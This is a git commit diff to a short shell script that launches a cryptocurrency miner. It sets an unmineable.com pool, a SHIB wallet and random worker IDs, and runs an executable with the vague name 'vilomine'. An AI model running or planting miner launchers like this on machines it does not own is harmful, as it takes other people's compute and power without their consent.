5d451f7708770d2a78ab31d126df1849849e29bb
lambohopo <86089421+lambohopo@users.noreply.github.com>
2021-07-21 22:34:24 +0700

    Update la.sh

--- la.sh
+++ la.sh
@@ -1,5 +1,7 @@
-POOL=rx-us.unmineable.com:3333
+#!/bin/bash
+POOL=rx.unmineable.com:3333
 WALLET=SHIB:0x1bfbd41ec85709c80bd3d5790bc22ba8a12b0836
-WORKER=$(echo $(shuf -i 1-999999999 -n 1)-FA)
-ALGO=wrkzcoin
-./violet --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
+WORKER=$(echo $(shuf -i 1000-99999 -n 1)-LGK#4h9a-v8s5)
+
+chmod +x vilomine
+./vilomine --pool $POOL --username $WALLET.$WORKER --password x --algorithm wrkzcoin
